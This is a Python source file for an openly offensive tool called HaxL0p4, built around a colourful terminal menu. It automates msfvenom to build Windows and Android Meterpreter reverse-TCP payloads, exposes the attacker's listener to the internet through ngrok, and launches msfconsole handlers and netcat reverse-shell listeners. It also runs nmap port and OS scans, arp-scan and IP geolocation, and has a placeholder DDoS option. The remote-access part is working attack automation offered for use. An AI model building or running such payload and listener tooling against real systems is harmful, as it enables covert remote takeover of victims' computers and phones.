#!/usr/bin/env python3

import os
import nmap
import requests
import json
from colorama import Fore, Style
#import argparse
from tkinter import *
from tkinter import ttk
from queue import Queue
#from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random
import subprocess
import time

invalid_option = f"{Fore.RED} [💀] Invalid option... {Style.RESET_ALL}\n"

Remote_options = f"""
 ╔══════════════════════════════════╗
 ║ [1] Payload Creator              ║ 
 ║ [2] Netcat Listener              ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Back                         ║
 ╚══════════════════════════════════╝  
"""
Network_options = f"""
 ╔══════════════════════════════════╗
 ║ [1] Network arp-scan             ║
 ║ [2] Ip & Website Scanner         ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Back                         ║
 ╚══════════════════════════════════╝
"""

modules = {

    "windows": "windows/meterpreter/reverse_tcp",
    "android": "android/meterpreter_reverse_tcp",
    "custom": "custom",
    "exit" : "Back",

}

Modules_Payload = f"""
 ╔═════════════════════════════════════╗
 ║ [1] {Fore.CYAN}{modules['windows']}{Style.RESET_ALL} ║ 
 ║ [2] {Fore.CYAN}{modules['android']}{Style.RESET_ALL} ║
 ║ [3] {Fore.CYAN}{modules['custom']}{Style.RESET_ALL}                          ║
 ╚═════════════════════════════════════╝
 ╔═════════════════════════════════════╗
 ║ [{Fore.RED}99{Style.RESET_ALL}]: {modules['exit']}                          ║
 ╚═════════════════════════════════════╝
"""

menu_options = f"""
 ╔══════════════════════════════════╗
 ║ [1] Remote Access                ║ 
 ║ [2] Network                      ║
 ║ [3] Track Location               ║
 ║ [4] Dos Attack                   ║
 ║ [5] IP Geolocation               ║
 ║                                  ║
 ║ [{Fore.CYAN}6{Style.RESET_ALL}] Update                       ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Exit                         ║
 ╚══════════════════════════════════╝
"""

# ================================ GUI =============================== #

def haxlopa_gui():
    gui = Tk()
    gui.geometry("1000x700")
    gui.config(bg="#1b1b1b")
    gui.resizable(False, False)

    title = ttk.Label(text="HaxL0p4 GUI", font=("Arial", 30, "bold"), foreground="#fff", background="#1b1b1b")
    title.pack(padx=10, pady=5)

    gui.mainloop()

# ================================================================== #

def letter_animation(text, ms):
    for letter in text:
        print(letter, end='', flush=True)
        time.sleep(ms)

# ========================== #

def ddos():
    os.system("clear && figlet L0p4 DDos")
    print(f"{Fore.RED}\nComing soon{Style.RESET_ALL}")
    while True:
        back = input("\nBack? Y/N: ")

        if back.lower() == "y":
            return
        else:
            break

# ========================== #

# Argument parser removed
# ...

# Start Ngrok Server
def startNgrokServer():
    ngrokPORT = input("\n LOCAL PORT > ") 

    command = f"gnome-terminal --geometry=80x24+1000+70 -- bash -c 'sudo ngrok tcp {ngrokPORT}; exec bach'"
    subprocess.run(command, shell=True)

def createPayload(module, LHOST, LPORT, NAME, FORMAT):
    if module == 1:
        print("\n")
        os.system(f"sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
    elif module == 2:
        os.system(f"sudo msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
    else: ...

def custom_module(MODULE, LHOST, LPORT, FORMAT, NAME):
    os.system("clear && Hax-Remote")
    os.system(f"sufo msfvenom -p {MODULE} LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")

def setPayload():
    os.system("clear && figlet HaxL0p4")

    print(Modules_Payload)
    
    while True:
        choice = input(f"\n{Fore.CYAN} HaxL0p4/CreatePayload {Style.RESET_ALL}> ")

        if choice not in ["1", "2", "3", "99"]:
            os.system("clear && figlet HaxL0p4")
            print(Modules_Payload)
            invalid_option = f" {Fore.RED}[💀] Invalid option. Please enter 'Y' or 'N'.{Style.RESET_ALL}\n"
            letter_animation(invalid_option, 0.03)
            continue

        if choice == "99":
            os.system("clear && figlet Hax-Remote")
            print(f"""
 ╔══════════════════════════════════╗
 ║ [1] Payload Creator              ║ 
 ║ [2] Netcat Listener              ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Back                         ║
 ╚══════════════════════════════════╝  
    """)
            return
        
        lanORwan = input("\n Start WAN server? Y/N: ")

        if lanORwan.lower() == "y":
            startNgrokServer()
        elif lanORwan.lower() == "n":
            pass
        else:
            letter_animation(invalid_option, 0.03)

        HOST = input(f"\n LHOST {Fore.CYAN}>{Style.RESET_ALL} ")

        while True:
            try:
                LPORT = int(input(f" LPORT {Fore.CYAN}>{Style.RESET_ALL} "))
                break
            except ValueError:
                print(f"\n {Fore.RED} [!]Invalid format. Please enter an integer.{Style.RESET_ALL}")

        FORMAT = input(f"\n FORMAT (Ex: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
        NAME = input(f" \n NAME {Fore.CYAN}>{Style.RESET_ALL} ")

        if choice == "1":
            createPayload(module=1, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
        elif choice == "2":
            createPayload(module=2, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
        elif choice == "3":
            module = input(f"{Fore.LIGHTBLUE_EX}MODULE{Style.RESET_ALL} > ")
            custom_module(MODULE=module, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
        elif choice == "99":
            break
        else:
            letter_animation("\n"+invalid_option, 0.03)

        os.system("clear && figlet HaxL0p4")
        
        msf = input(f"\nStart {Fore.BLUE}msfconsole{Style.RESET_ALL}? Y/N: ")
        if msf.lower() == "y":
            command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use windows/meterpreter/reverse_tcp; set LHOST {HOST}; set LPORT {LPORT}, exploit; exploit; exec bash\"'"
            subprocess.run(command, shell=True)
            return menu()
        elif msf.lower() == "n":
            return menu()

# Netcat reverse shell listener

def netcatListener():
    try:
        os.system("clear && figlet HaxL0p4-NC")

        while True:
            try:
                port = int(input("\n PORT: "))
                break
            except ValueError:
                invalid_port = f"{Fore.RED}\n [💀] Invalid port...{Style.RESET_ALL}"
                letter_animation(invalid_port, 0.03)
                return netcatListener()

        proxychains = input(" Use proxychains? Y/N: ")

        if proxychains.lower() in ["y", "n"]:
            if proxychains.lower() == "y":
                os.system(f"sudo proxychains nc -lvp {port}")
            elif proxychains.lower() == "n":
                command = f"sudo nc -lvp {port}"
                os.system(command)
                while True:
                    exit = input(f'\n{Fore.BLUE}Close the revese shell?{Style.RESET_ALL} Y/N: ')
                    if exit.lower() == "y":
                        os.system("clear && figlet Hax-Remote")
                        print(Remote_options)
                        break
                    elif exit.lower() == "n":
                        return
        else:
            invalid_option = f"\n{Fore.RED} [💀] Invalid option... Please enter Y or N. {Style.RESET_ALL}"
            letter_animation(invalid_option, 0.03)
            os.system("clear && figlet HaxL0p4-NC")
            return netcatListener()
        
    except KeyboardInterrupt:
        os.system("clear && figlet Hax-Remote")
        print(Remote_options)

def arp_scan():
    os.system("clear && figlet Hax-Scan")
    os.system("\n\narp-scan -l")

    back = input(f"{Fore.RED}\n\nBACK? Y/N: {Style.RESET_ALL}")
    if back.lower() == "y":
        network()
    else:
        pass

def website_scanner():
    os.system("clear && figlet HaxL0p4")
    pass

def ip_scanner():
    os.system("clear && figlet HaxL0p4")

    scanner = nmap.PortScanner()

    print("\n HaxL0p4 automation hacking tool")
    print(" <-------------------------------------------------------------->")

    ip_addr = input(' Ip address do you want to scan: ')
    print(f" The ip you entered is: {Fore.RED}{ip_addr}{Style.RESET_ALL}")

    resp = input(f"""\n Please enter the type os scan do you want to run
 ╔══════════════════════════════════╗
 ║ [1] SYN ACK Scan                 ║ 
 ║ [2] UDP Scan                     ║
 ║ [3] Complete Scan                ║
 ╚══════════════════════════════════╝               
 ╔═════════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}]: Back                           ║
 ║ [{Fore.RED}99{Style.RESET_ALL}]: Menu                          ║
 ╚═════════════════════════════════════╝
                 
 {Fore.CYAN}HaxL0p4/Network/Scanner/IpScanner/options{Style.RESET_ALL} > """)

    if resp == "1":
        try:
            print(" \n Nmap Version: ", scanner.nmap_version())
            letter_animation(f" {Fore.RED}[!] Scanning...{Style.RESET_ALL}\n\n ", 0.03)
            scanner.scan(ip_addr, '1-1024', arguments="-v -sS")
            print(f"tcp: method: syn, services: 1-1024\n Ip Status: up")
            open_ports = scanner[ip_addr]['tcp'].keys()
            formatted_ports = ', '.join(map(str, open_ports))
            print(" Open Ports: ", formatted_ports)
        except Exception as e:
            print(f" An error occurred: {e}")
    elif resp == "2":
        try:
            print(" \n Nmap Version: ", scanner.nmap_version())
            letter_animation(f" {Fore.RED}[!] Scanning...{Style.RESET_ALL}\n\n ", 0.03)
            scanner.scan(ip_addr, '1-1024', arguments="-v -sU")
            print(f"udp: services: 1-1024\n Ip Status: {Fore.RED}up{Style.RESET_ALL}")
            print(scanner[ip_addr].all_protocols())
            open_ports = scanner[ip_addr]['udp'].keys()
            formatted_ports = ', '.join(map(str, open_ports))
            print(" Open Ports: ", formatted_ports)
        except Exception as e:
            print(f"An error occurred: {e}")
    elif resp == "3":
        try:
            print(" \n Nmap Version: ", scanner.nmap_version())
            letter_animation(f" {Fore.RED}[!] Scanning...{Style.RESET_ALL}\n\n ", 0.03)
            scanner.scan(ip_addr, '1-1024', arguments="-v -sS -sC -A -O")
            print(f"tcp: method: syn, services: 1-1024\n Ip Status: up")

            if 'osclass' in scanner[ip_addr]:
                detected_os = scanner[ip_addr]['osclass'][0]['osfamily']
                print(f"{Fore.LIGHTCYAN_EX} Operative System: {detected_os}{Style.RESET_ALL}")
            else:
                print(f"{Fore.LIGHTCYAN_EX} Operative System: Information not available{Style.RESET_ALL}")

            open_ports = scanner[ip_addr]['tcp'].keys()
            formatted_ports = ', '.join(map(str, open_ports))
            print(" Open Ports: ", formatted_ports)
        
        except Exception as e:
            print(f" An error occurred: {e}")
    elif resp == "0":
        return ip_scanner()
    elif resp == "99":
        return menu()
    elif resp >= '4':
        letter_animation(invalid_option, 0.03)

    loop = input("\n\n Repeat Scan? Y/N: ")
    while True:
        if loop.lower() == "y":
            return ip_scanner()
        elif loop.lower() == "n":
            return menu()
        else:
            letter_animation(invalid_option, 0.03)

def ip_lookup():      
    os.system("clear && figlet HaxL0p4")
    ip = input(f"\n{Fore.CYAN}WEBSITE TARGET{Style.RESET_ALL} > ")
    print("\n")
    os.system(f" nslookup {ip}")

    while True:
        back = input(f"\n{Fore.RED}Repeat? Y/N: {Style.RESET_ALL}")
        if back.lower() == "y":
            ip_lookup()
        elif back.lower() == "n":
            network()
        else:
            letter_animation(invalid_option, 0.03)

def scanner():
    os.system("clear && figlet HaxL0p4")
    netScan_options = f"""
 ╔═════════════════════════════════════╗
 ║ [1] IP Scanner                      ║ 
 ║ [2] soon                            ║
 ║ [3] Website Lookup                  ║
 ╚═════════════════════════════════════╝

 ╔═════════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}]: Back                           ║
 ║ [{Fore.RED}99{Style.RESET_ALL}]: Menu                          ║
 ╚═════════════════════════════════════╝
"""
    print(netScan_options)
    s = input(f"{Fore.CYAN} HaxL0p4/network/IpScanner{Style.RESET_ALL} > ")

    while True:
        if s == "1":
            ip_scanner()
        elif s == "2":
            letter_animation("\n"+" Coming Soon...", 0.03)
            scanner()
        elif s == "3":
            ip_lookup()
        elif s == "0":
            return network()
        elif s == "99":
            return menu()
        else: 
            letter_animation("\n"+invalid_option, 0.03)
            return scanner()

def network():
    os.system("clear && figlet Hax-Net")
    print(Network_options)
    choice = input(f"\n{Fore.CYAN} HaxL0p4/network{Style.RESET_ALL} > ")

    while True:
        if choice == "1":
            arp_scan()
        elif choice == "2":
            scanner()
        elif choice == "0":
            return
        else:
            os.system("clear && figlet Hax-Net")
            print(Network_options)
            invalid_option = f"{Fore.RED} [💀] Invalid option...{Style.RESET_ALL}"
            letter_animation(invalid_option, 0.03)
            return network()

def track_location(): ...

def get_public_ip():
    response = requests.get("https://api.ipify.org")
    return response.text

def ipGeolocation():
    while True:
        os.system("clear && figlet HaxL0p4")

        public_ip = get_public_ip()
        print(f"\nYour ip address: {Fore.RED}{public_ip}{Style.RESET_ALL}")
        print(f'\nType "{Fore.RED}0{Style.RESET_ALL}" for return back')

        ip_address = input("\nip: ")

        if ip_address == "0":
            return

        request_url = 'https://geolocation-db.com/jsonp/' + ip_address
        response = requests.get(request_url)
        result = response.content.decode()
        result = result.split("(")[1].strip(")")
        result = json.loads(result)

        print("\nGeolocation Information:")
        print(f"Country Code: {result['country_code']}")
        print(f"Country Name: {result['country_name']}")
        print(f"City: {result['city']}")
        print(f"Postal Code: {result['postal']}")
        print(f"Latitude: {result['latitude']}")
        print(f"Longitude: {result['longitude']}")
        print(f"IPv4 Address: {result['IPv4']}")
        print(f"State: {result['state']}")

        back = input("\nBack Y/N: ")

        if back.lower() == "y":
            return
        elif back.lower() == "n":
            pass
        else:
            print("Invalid option...")

def RemoteAccess() :
    os.system("clear && figlet Hax-Remote")

    while True:
        print(Remote_options)
        choice = input(f"\n{Fore.CYAN} HaxL0p4/RemoteAccess {Style.RESET_ALL}> ")

        if choice == "1":
            setPayload()
        elif choice == "2":
            netcatListener()
        elif choice == "0":
            menu()
        else:
            os.system("clear && figlet Hax-Remote")
            print(Remote_options)
            invalid_option = f"{Fore.RED} [💀] Invalid option...{Style.RESET_ALL}"
            letter_animation(invalid_option, 0.03)

def menu():
    os.system("clear && figlet Hax-Menu")

    while True:
        print(menu_options)
        choice = input(f"\n{Fore.CYAN} HaxL0p4 {Style.RESET_ALL}> ")

        if choice == "1":
            RemoteAccess()
        elif choice == "2":
            network()
        elif choice == "3":
            track_location()
        elif choice == "4":
            ddos()
        elif choice == "5":
            ipGeolocation()
        elif choice == "6":
            update()
        elif choice == "0":
            sys.exit()
        else:
            os.system("clear && figlet HaxL0p4")
            print(menu_options)
            invalid_option = f"{Fore.RED} [💀] Invalid option...{Style.RESET_ALL}"
            letter_animation(invalid_option, 0.03)

def update():
    os.system("clear && figlet HaxL0p4")
    os.system("git stash && git pull")
   # update_msg = f"""
  #  {Fore.LIGHTCYAN_EX}
  #  [💡] Please download the new version.
  #  [💡] Link: https://github.com/L0PA/HaxL0p4
  #  {Style.RESET_ALL}
  #  """
  #  print(update_msg)
    while True:
        back = input(f"\n{Fore.RED}Back? Y/N: {Style.RESET_ALL}")

        if back.lower() == "y":
            menu()
        elif back.lower() == "n":
            pass
        else:
            print(f"\n{Fore.RED}[💀] Invalid option...{Style.RESET_ALL}")

def main():
    os.system("clear && figlet HaxL0p4")
    #letter_animation(" [💡] Loading...", 0.03)
    menu()

if __name__ == "__main__":
    main()
